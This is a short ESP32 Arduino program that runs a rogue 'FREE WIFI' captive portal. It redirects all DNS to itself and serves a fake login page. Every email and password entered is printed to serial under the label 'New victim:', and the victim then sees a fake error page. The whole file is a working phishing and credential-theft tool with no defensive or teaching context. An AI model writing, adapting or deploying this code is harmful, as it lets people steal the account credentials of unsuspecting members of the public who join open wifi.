#include <WiFi.h>
#include <WiFiClient.h>
#include <WiFiAP.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "template.h"
#include "error.h"

IPAddress apIP(192,168,4,1);
DNSServer dnsServer;
WebServer server(80);
const byte DNS_PORT = 53;
String Log="";

void setup() {
  Serial.begin(38400);
  WiFi.mode(WIFI_AP);
  WiFi.softAP("FREE WIFI");
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/",[]() {
    server.send(200, "text/html", TEMPLATE);
  });

  server.on("/getlog", []() {
    String email = server.arg("email");
    String password = server.arg("password");
    delay(1500);
    Serial.println("-------------------------------------------");
    Serial.println("New victim:");
    Serial.println("-------------------------------------------");
    Serial.print("Email: ");
    Serial.println(email);
    delay(1000);
    Serial.print("Password: ");
    Serial.println(password);
    Serial.println("-------------------------------------------");
    Serial.println("");
    Serial.println("");
    
    server.send(500, "text/html", ERROR);
    Log="";
  });
  
  server.begin();
}

void loop() {
  server.handleClient();
  dnsServer.processNextRequest();
}
